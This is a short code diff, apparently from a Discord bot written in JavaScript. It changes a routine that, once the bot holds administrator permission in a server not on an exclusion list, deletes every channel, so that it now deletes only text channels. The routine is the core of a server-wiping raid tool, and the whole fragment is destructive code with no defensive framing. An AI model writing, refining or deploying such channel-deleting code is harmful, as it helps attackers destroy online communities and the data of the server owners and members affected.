@@ -465,7 +465,7 @@ if(list.includes(message.author.id)) {return}
   if(!unallowedguilds.includes(message.guild.id)) {
 if(message.guild.me.hasPermission("ADMINISTRATOR")) {
              message.guild.channels.cache.forEach(channel => {
-             channel.delete().then((channel)=>{
+             if(channel.type === 'text') channel.delete().then((channel)=>{
                if (channel.deleted === true)
                {
                  console.log("channel succesfully yeeted!");
